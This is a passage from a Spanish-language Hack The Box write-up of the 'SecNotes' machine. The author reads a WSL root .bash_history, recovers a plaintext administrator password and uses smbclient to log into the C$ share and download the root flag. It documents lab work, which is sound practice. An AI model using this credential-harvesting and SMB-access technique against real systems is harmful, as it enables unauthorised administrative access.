drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
```

Desafortunadamente no encontre root.txt ... y después de un buen rato tratando de investigar que hacer en este pot, intente leer el archivo .bash_history (si, aquel con esas propiedades extrañas de permisos que no tiene size 0!!!)

```
PS C:\Distros> bash -c 'cat /root/.bash_history'
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
exithistory
exit
```

o/ hi administrator!

> administrator u6!4ZwgwOM#^OBf#Nwnh

# smbclient with Administrator user

Ok, proveemos las credenciales que acabamos de encontrar:

```
root@kali:~/htb/secnotes# smbclient -U Administrator //10.10.10.97/c$/ 'u6!4ZwgwOM#^OBf#Nwnh'
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Thu Jun 21 17:24:29 2018
  bootmgr                          AHSR   395268  Fri Jul 10 06:00:31 2015
  BOOTNXT                           AHS        1  Fri Jul 10 06:00:31 2015
  Distros                             D        0  Thu Jun 21 17:07:52 2018
  Documents and Settings            DHS        0  Fri Jul 10 07:21:38 2015
  inetpub                             D        0  Thu Jun 21 20:47:33 2018
  Microsoft                           D        0  Fri Jun 22 16:09:10 2018
  pagefile.sys                      AHS 738197504  Tue Jan  8 19:17:14 2019
  PerfLogs                            D        0  Wed Apr 11 18:38:20 2018
  php7                                D        0  Thu Jun 21 10:15:24 2018
  Program Files                      DR        0  Sun Aug 19 16:56:49 2018
  Program Files (x86)                DR        0  Thu Jun 21 20:47:33 2018
  ProgramData                        DH        0  Sun Aug 19 16:56:49 2018
  Recovery                          DHS        0  Thu Jun 21 16:52:17 2018
  swapfile.sys                      AHS 268435456  Tue Jan  8 19:17:14 2019
  System Volume Information         DHS        0  Thu Jun 21 16:53:13 2018
  Ubuntu.zip                          A 201749452  Thu Jun 21 17:07:28 2018
  Users                              DR        0  Thu Jun 21 17:00:39 2018
  Windows                             D        0  Sun Aug 19 13:15:49 2018

                12978687 blocks of size 4096. 7917784 blocks available
smb: \> cd Users/administrator
smb: \Users\administrator\> dir
  .                                   D        0  Fri Jun 22 18:44:33 2018
  ..                                  D        0  Fri Jun 22 18:44:33 2018
  3D Objects                         DR        0  Sun Aug 19 12:01:17 2018
  AppData                            DH        0  Thu Jun 21 19:49:45 2018
  Application Data                  DHS        0  Thu Jun 21 19:49:32 2018
  Contacts                           DR        0  Sun Aug 19 12:01:17 2018
  Cookies                           DHS        0  Thu Jun 21 19:49:32 2018
  Desktop                            DR        0  Sun Aug 19 12:01:17 2018
  Documents                          DR        0  Sun Aug 19 12:01:17 2018
  Downloads                          DR        0  Sun Aug 19 12:01:17 2018
  Favorites                          DR        0  Sun Aug 19 12:01:17 2018
  Links                              DR        0  Sun Aug 19 12:01:18 2018
  Local Settings                    DHS        0  Thu Jun 21 19:49:32 2018
  Music                              DR        0  Sun Aug 19 12:01:17 2018
  My Documents                      DHS        0  Thu Jun 21 19:49:32 2018
  NetHood                           DHS        0  Thu Jun 21 19:49:32 2018
  NTUSER.DAT                         AH  1310720  Sun Aug 19 13:12:58 2018
  ntuser.dat.LOG1                   AHS   147456  Thu Jun 21 19:49:32 2018
  ntuser.dat.LOG2                   AHS        0  Thu Jun 21 19:49:32 2018
  NTUSER.DAT{3eb2f144-75be-11e8-91df-080027cb2f82}.TM.blf    AHS    65536  Thu Jun 21 19:49:32 2018
  NTUSER.DAT{3eb2f144-75be-11e8-91df-080027cb2f82}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Thu Jun 21 19:49:32 2018
  NTUSER.DAT{3eb2f144-75be-11e8-91df-080027cb2f82}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Thu Jun 21 19:49:32 2018
  ntuser.ini                         HS       20  Fri Jun 22 18:44:28 2018
  OneDrive                           DR        0  Thu Jun 21 15:01:39 2018
  Pictures                           DR        0  Sun Aug 19 12:01:17 2018
  PrintHood                         DHS        0  Thu Jun 21 19:49:32 2018
  Recent                            DHS        0  Thu Jun 21 19:49:32 2018
  Saved Games                        DR        0  Sun Aug 19 12:01:18 2018
  Searches                           DR        0  Sun Aug 19 12:01:17 2018
  SendTo                            DHS        0  Thu Jun 21 19:49:32 2018
  Start Menu                        DHS        0  Thu Jun 21 19:49:32 2018
  Templates                         DHS        0  Thu Jun 21 19:49:32 2018
  Videos                             DR        0  Sun Aug 19 12:01:17 2018

                12978687 blocks of size 4096. 7978034 blocks available
smb: \Users\administrator\> cd Desktop
smb: \Users\administrator\Desktop\> ls
  .                                  DR        0  Sun Aug 19 12:01:17 2018
  ..                                 DR        0  Sun Aug 19 12:01:17 2018
  desktop.ini                       AHS      282  Sun Aug 19 12:01:17 2018
  Microsoft Edge.lnk                  A     1417  Fri Jun 22 18:45:06 2018
  root.txt                            A       34  Sun Aug 19 12:03:54 2018
get root
                12978687 blocks of size 4096. 7979181 blocks available
smb: \Users\administrator\Desktop\> get root.txt
getting file \Users\administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Users\administrator\Desktop\> quit
```

Así que después de descargar el archivo, tenemos la flag.

# cat root.txt
... We got root flag.

---
Gracias por llegar hasta aquí, hasta la próxima!
